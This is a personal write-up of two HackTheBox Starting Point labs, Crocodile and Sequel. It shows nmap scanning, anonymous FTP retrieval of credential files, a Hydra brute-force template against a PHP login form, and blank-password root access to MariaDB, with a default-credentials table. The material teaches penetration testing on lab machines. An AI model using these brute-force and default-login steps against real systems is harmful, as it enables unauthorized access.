# HTB Starting Point — Progress Tracker

| Machine | Tier | Services | Date Completed | Write-Up |
|---------|------|----------|----------------|----------|
| **Sequel** | 1 | MySQL/MariaDB (3306) | 2026-03-25 | [↓ Jump to Sequel](#htb-starting-point-sequel-mysqlmariadb) |
| **Crocodile** | 1 | FTP (21), HTTP (80) | 2026-03-26 | [↓ Jump to Crocodile](#htb-starting-point-crocodile-ftp--web) |
| **Responder** | 1 | — | — | — |
| **Three** | 1 | — | — | — |

---

> **Tier 1 Progress:** 2/4 machines completed (50%)  
> **Next:** Responder → Three  
> **Last Updated:** March 26, 2026

---

<!-- Your existing Crocodile write-up starts here -->

# HTB Starting Point: Crocodile (FTP + Web)

## Machine Info

| Field | Value |
|-------|-------|
| **Name** | Crocodile |
| **Difficulty** | Starting Point (Tier 1) |
| **Services** | FTP (21), HTTP (80) |
| **Date Completed** | 2026-03-26 |

---

## 📋 Table of Contents

- [Environment Setup](#environment-setup)
- [Reconnaissance](#reconnaissance)
- [FTP Enumeration](#ftp-enumeration)
- [Web Enumeration](#web-enumeration)
- [Credential Brute Force](#credential-brute-force)
- [Flag Discovery](#flag-discovery)
- [Questions & Answers](#questions--answers)
- [Quick Reference](#quick-reference)
- [Lessons Learned](#lessons-learned)
- [Resources](#resources)
- [Tags](#tags)

---

## 💻 Environment Setup

To ensure reproducibility and consistent results, the following environment was used for this engagement:

| Component | Specification |
|-----------|---------------|
| **Attack Machine** | Kali Linux (2024.x) |
| **Connectivity** | OpenVPN (HTB Lab Configuration) |
| **Tools Used** | Nmap, ftp, curl, hydra |

> **Note:** Ensure your HTB VPN is active and you can `ping` the target IP before beginning enumeration.

---

## 🔍 Reconnaissance

### Port Scan

```bash
# Fast port scan to discover open ports
nmap -p- --min-rate 1000 10.129.55.61
```

**Results:**
```text
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
```

### Service Version Detection with Nmap

```bash
# Run default scripts and version detection
nmap -sC -sV -p 21,80 10.129.55.61
```

**Output:**
```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
| -rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
|_ftp-syst: 
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

**Interpretation:**

| Service | Version | Key Info |
|---------|---------|----------|
| FTP | vsFTPd 3.0.3 | Anonymous login allowed; contains credential files |
| HTTP | Apache 2.4.41 (Ubuntu) | Default page, PHP likely enabled |

---

## 📁 FTP Enumeration

### Anonymous FTP Access

```bash
# Connect to FTP server
ftp 10.129.55.61
```

**Login:**
```text
Name (10.129.55.61:kali): anonymous
Password: (press Enter)
230 Login successful.
```

### Listing Files

```bash
ftp> ls -la
```

**Output:**
```text
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
```

### Download Credential Files

```bash
ftp> get allowed.userlist
ftp> get allowed.userlist.passwd
ftp> exit
```

### View Downloaded Files

```bash
# Usernames
cat allowed.userlist
```

**Usernames:**
```text
aron
pwnmeow
egotisticalsw
admin
```

```bash
# Passwords
cat allowed.userlist.passwd
```

**Passwords:**
```text
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

---

## 🌐 Web Enumeration

### Initial Web Server Check

```bash
# Check HTTP headers
curl -I http://10.129.55.61/
```

**Output:**
```text
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
```

### Discover Protected Dashboard

```bash
# Check /dashboard endpoint
curl -I http://10.129.55.61/dashboard/
```

**Output:**
```text
HTTP/1.1 302 Found
Set-Cookie: PHPSESSID=ud15qdc4moasiq6godrdkemn31; path=/
location: /login.php
```

### Verify Login Page

```bash
# Check if login.php exists
curl -I http://10.129.55.61/login.php
```

**Output:**
```text
HTTP/1.1 200 OK
Set-Cookie: PHPSESSID=3b3rt8cn7imrdq717gl32021gj; path=/
Content-Type: text/html; charset=UTF-8
```

**Key Findings:**
- PHP application with session management
- Protected area: `/dashboard/`
- Authentication endpoint: `/login.php`

---

## 🔑 Credential Brute Force

### Install Hydra (if needed)

```bash
sudo apt update
sudo apt install hydra -y
```

### Run Hydra Against Login Page

```bash
hydra -L allowed.userlist -P allowed.userlist.passwd 10.129.55.61 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=incorrect" \
  -t 1 -w 3 -V -f
```

**Command Breakdown:**

| Parameter | Meaning |
|-----------|---------|
| `-L allowed.userlist` | Username list file |
| `-P allowed.userlist.passwd` | Password list file |
| `http-post-form` | Module for POST-based login forms |
| `/login.php` | Target login page |
| `username=^USER^&password=^PASS^` | Form parameters |
| `F=incorrect` | String indicating failed login |
| `-t 1` | Single thread (slow but reliable) |
| `-w 3` | Wait time between attempts |
| `-V` | Verbose output |
| `-f` | Stop after first success |

**Hydra Output:**
```text
[ATTEMPT] target 10.129.55.61 - login "aron" - pass "root" - 1 of 16
[80][http-post-form] host: 10.129.55.61   login: aron   password: root
[STATUS] attack finished for 10.129.55.61 (valid pair found)
```

✅ **Valid Credentials Found**

| Field | Value |
|-------|-------|
| **Username** | aron |
| **Password** | root |

---

## 🎯 Flag Discovery

### Authenticate and Retrieve Flag

```bash
# Login with found credentials and get flag
curl -X POST http://10.129.55.61/login.php \
  -d "username=aron&password=root" \
  -L -s --max-time 15 | grep -E "HTB{|flag"
```

**Output (example):**
```html
<h2>Welcome aron!</h2>
<p>HTB{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}</p>
```

### Alternative Method with Cookie

```bash
# Save session cookie
curl -X POST http://10.129.55.61/login.php \
  -d "username=aron&password=root" \
  -c cookies.txt -L --max-time 15

# Access dashboard with cookie
curl -b cookies.txt http://10.129.55.61/dashboard/ -s | grep -E "HTB{|flag"
```

---

## 📝 Questions & Answers

| # | Question | Answer |
|---|----------|--------|
| 1 | What port is the web server running on? | 80 |
| 2 | What is the Apache version? | 2.4.41 |
| 3 | What FTP server version is running? | vsFTPd 3.0.3 |
| 4 | What files did you find on the FTP server? | allowed.userlist, allowed.userlist.passwd |
| 5 | What credentials did you use to login to the web application? | aron:root |
| 6 | What is the flag? | HTB{...} |

---

## ⚡ Quick Reference

### Nmap Commands

```bash
# Full port scan
nmap -p- --min-rate 1000 10.129.55.61

# Service detection with scripts
nmap -sC -sV -p 21,80 10.129.55.61
```

### FTP Commands

```bash
# Connect anonymously
ftp 10.129.55.61
# Username: anonymous
# Password: (blank)

# Download files
get allowed.userlist
get allowed.userlist.passwd
```

### Hydra Command Template

```bash
hydra -L users.txt -P passes.txt <IP> http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=incorrect" \
  -t 1 -w 3 -V -f
```

### Curl Authentication

```bash
# POST login
curl -X POST http://10.129.55.61/login.php \
  -d "username=USER&password=PASS" \
  -L -s
```

---

## 💡 Lessons Learned

| # | Lesson |
|---|--------|
| 1 | **Always combine `-sC` and `-sV`** — Default scripts and version detection together reveal the most information about a service. |
| 2 | **Check FTP anonymous access** — A common misconfiguration that often exposes sensitive files like credential lists. |
| 3 | **Follow redirect chains** — The redirect from `/dashboard/` to `/login.php` revealed the authentication endpoint. |
| 4 | **Use Hydra for form-based login** — More reliable than manual curl loops, especially with the correct failure string. |
| 5 | **Credential reuse is common** — FTP credentials frequently work on the web application. |
| 6 | **Session cookies reveal technology** — The `PHPSESSID` cookie confirmed a PHP application. |

---

## 🔗 Resources

- [HTB Starting Point](https://www.hackthebox.com/starting-point)
- [vsFTPd Documentation](https://security.appspot.com/vsftpd.html)
- [Apache HTTP Server](https://httpd.apache.org/)
- [Hydra GitHub](https://github.com/vanhauser-thc/thc-hydra)

---

## 🏷️ Tags

#htb #starting-point #crocodile #ftp #apache #hydra #bruteforce #web-enumeration

---

**Machine Completed ✅**

*Last Updated: March 26, 2026*


# HTB Starting Point: Sequel (MySQL/MariaDB)

<div align="center">
  
| **Machine Info** | |
|------------------|-|
| **Name** | Sequel |
| **Difficulty** | Starting Point (Tier 1) |
| **Service** | MySQL / MariaDB |
| **Port** | 3306 |
| **Date Completed** | 2026-03-25 |

</div>

---

## 📋 Table of Contents
1. [Reconnaissance](#-reconnaissance)
2. [Service Enumeration](#-service-enumeration)
3. [Database Access](#-database-access)
4. [Flag Discovery](#-flag-discovery)
5. [Questions & Answers](#-questions--answers)
6. [Quick Reference](#-quick-reference)
7. [Lessons Learned](#-lessons-learned)

---

## 💻 Environment Setup

To ensure reproducibility and consistent results, the following environment was used for this engagement:

| **Component** | **Specification** |
| :--- | :--- |
| **Attack Machine** | Kali Linux (2024.x) / Parrot Security OS |
| **Hypervisor** | VMware Workstation / Oracle VirtualBox |
| **Connectivity** | OpenVPN (HTB Lab Configuration) |
| **Tools Used** | Nmap, MySQL-Client, Netcat (nc) |

> **Note:** Ensure your HTB VPN is active and you can `ping` the target IP before beginning enumeration.

---

## 🔍 Reconnaissance

### Port Scan
```bash
# Fast port scan to discover open ports
nmap -p- --min-rate 1000 10.129.95.232
```

**Results:**
```
PORT     STATE SERVICE
3306/tcp open  mysql
```

Only port **3306 (MySQL)** is open, indicating a database server.

---

## 🛠️ Service Enumeration

### Version Detection with Nmap
```bash
# Service version detection
nmap -p 3306 -sV 10.129.95.232
```

### Manual Banner Grab (When Nmap Fails)
```bash
# Send MySQL protocol handshake to trigger version banner
(echo -e "\x00\x00\x00\x01"; sleep 1) | nc -nv 10.129.95.232 3306 | strings | grep -i "mysql\|mariadb"
```

**Output:**
```
5.5.5-10.3.27-MariaDB-0+deb10u1
mysql_native_password
```

**Interpretation:**
| Field | Value |
|-------|-------|
| **Database** | MariaDB 10.3.27 |
| **OS** | Debian 10 (buster) |
| **Auth Method** | mysql_native_password |

---

## 🔑 Database Access

### Initial Connection Attempt (SSL Error)
```bash
mysql -h 10.129.95.232 -u root
```

**Error:**
```
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
```

### Fix: Disable SSL
```bash
# Connect with SSL disabled
mysql -h 10.129.95.232 -u root --ssl=0

# Faster connection with auto-rehash disabled
mysql -h 10.129.95.232 -u root --ssl=0 -A
```

**✅ Success!** Connected as `root` with blank password (default credentials).

---

## 🗄️ Flag Discovery

### Step 1: List All Databases
```sql
SHOW DATABASES;
```

**Output:**
```
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

### Step 2: Select Target Database
```sql
USE htb;
```

### Step 3: List Tables
```sql
SHOW TABLES;
```

**Output:**
```
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```

### Step 4: Explore Tables
```sql
-- Check users table
SELECT * FROM users;
```

**Output:**
```
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
```

```sql
-- Check config table (flag location)
SELECT * FROM config;
```

**Output:**
```
+----+------+--------------------------+
| id | name | value                    |
+----+------+--------------------------+
|  1 | flag | HTB{REDACTED}   |
+----+------+--------------------------+
```

### 🎯 Flag Found!
```
HTB{REDACTED}
```

---

## 📝 Questions & Answers

| # | Question | Answer |
|---|----------|--------|
| 1 | When using the MySQL command line client, what switch do we need to use in order to specify a login username? | `-u` |
| 2 | Which username allows us to log into this MariaDB instance without providing a password? | `root` |
| 3 | In SQL, what symbol can we use to specify within the query that we want to display everything inside a table? | `*` (asterisk) |
| 4 | What is the name of the fourth database that's unique to this host? | `htb` |

---

## ⚡ Quick Reference

### MySQL Connection Commands
```bash
# Standard connection
mysql -h <IP> -u root --ssl=0

# Fast connection (no auto-rehash)
mysql -h <IP> -u root --ssl=0 -A

# With password prompt
mysql -h <IP> -u root -p --ssl=0
```

### Essential SQL Commands
```sql
-- Database exploration
SHOW DATABASES;
USE database_name;
SHOW TABLES;

-- Data retrieval
SELECT * FROM table_name;
DESCRIBE table_name;

-- System information
SELECT VERSION();
SELECT CURRENT_USER();
SELECT user, host FROM mysql.user;
```

### Banner Grab Commands
```bash
# MySQL / MariaDB
(echo -e "\x00\x00\x00\x01"; sleep 1) | nc -nv <IP> 3306 | strings | grep -i "mysql\|mariadb"

# Redis
echo -e "*1\r\n\$4\r\nINFO\r\n" | nc -nv <IP> 6379 | strings | grep redis_version

# Web Server
curl -I http://<IP>
```

---

## 🐛 Troubleshooting: SSL Errors

| Error | Solution |
|-------|----------|
| `TLS/SSL error: SSL is required` | Add `--ssl=0` or `--skip-ssl` |
| `unknown variable 'ssl-mode=DISABLED'` | Use `--ssl=0` (older MySQL versions) |
| `Can't connect to MySQL server` | Verify VPN connection and IP address |

---

## 📚 Default Credentials Reference

| Username | Password | Success Rate |
|----------|----------|--------------|
| `root` | (blank) | ⭐⭐⭐⭐⭐ (HTB Starting Point) |
| `root` | `root` | ⭐⭐ |
| `admin` | (blank) | ⭐ |
| `root` | `toor` | ⭐ |

---

## 💡 Lessons Learned

| # | Lesson |
|---|--------|
| 1 | **Nmap isn't always enough** — Use service-specific banner grabs for version enumeration |
| 2 | **MySQL requires a protocol handshake** — Send `\x00\x00\x00\x01` to trigger version banner |
| 3 | **SSL errors are common** — Use `--ssl=0` to disable SSL on older MySQL versions |
| 4 | **Default credentials work** — Always try `root:blank` first on HTB Starting Point |
| 5 | **`*` is your friend** — Use `SELECT * FROM table` to explore unknown table structures |

---

## 🔗 Resources

- [MySQL Official Documentation](https://dev.mysql.com/doc/)
- [MariaDB Knowledge Base](https://mariadb.com/kb/en/documentation/)
- [HTB Academy: SQL Fundamentals](https://academy.hackthebox.com/course/preview/sql-fundamentals)
- [Nmap MySQL Scripts](https://nmap.org/nsedoc/categories/mysql.html)

---

## 🏷️ Tags

`#htb` `#starting-point` `#sequel` `#mysql` `#mariadb` `#sql` `#database` `#enumeration` `#banner-grabbing`

---

<div align="center">
  
**Machine Completed** ✅

*Last Updated: March 25, 2026*

</div>
